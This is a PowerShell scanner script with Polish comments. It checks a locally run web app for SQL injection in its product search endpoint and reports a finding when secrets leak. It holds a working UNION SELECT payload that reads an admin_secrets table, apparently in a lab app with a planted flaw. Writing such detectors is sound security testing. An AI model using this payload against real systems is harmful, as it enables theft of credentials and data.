#Requires -Version 5.1
<#
.SYNOPSIS
    Detektor SQL Injection (GET /api/products/search) na dzialajacej aplikacji.
.DESCRIPTION
    Wstrzykuje payload UNION czytajacy tabele admin_secrets. Jesli w odpowiedzi
    pojawi sie sekret z tej tabeli (FLAG) -> podatnosc wykryta. Nie zmienia stanu.
    Kod wyjscia: 1 = wykryto, 0 = czysto, 2 = API nie odpowiada.
.EXAMPLE
    pwsh ./scripts/scan-sqli.ps1
#>
[CmdletBinding()]
param(
    [string]$BaseUrl = 'http://localhost:8000',
    [int]$TimeoutSec = 10
)
$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '_scan-common.ps1')

if (-not (Test-ApiAlive -BaseUrl $BaseUrl -TimeoutSec $TimeoutSec)) {
    Write-Host "API nie odpowiada pod $BaseUrl (uruchom: docker compose up -d)." -ForegroundColor Red
    exit 2
}

$payload = "zzz%' UNION SELECT id, name, value, 0, value FROM admin_secrets -- "
$r = Invoke-Api -BaseUrl $BaseUrl -Method Get `
    -Path "/api/products/search?q=$([uri]::EscapeDataString($payload))" -TimeoutSec $TimeoutSec

$leak = $null
if ($r.Ok -and $r.Data) {
    $leak = @($r.Data | Where-Object {
            $_.name -eq 'admin_password' -or ($_.description -and $_.description -match 'FLAG\{')
        }) | Select-Object -First 1
}
$detected = [bool]$leak
$proof = if ($detected) {
    "wyciek z admin_secrets: $($leak.name) = $($leak.description)"
}
else { "brak wycieku (HTTP $($r.Status))" }

Write-Finding -Name 'SQL Injection' -Endpoint 'GET /api/products/search' -Detected $detected -Proof $proof
if ($detected) { exit 1 } else { exit 0 }
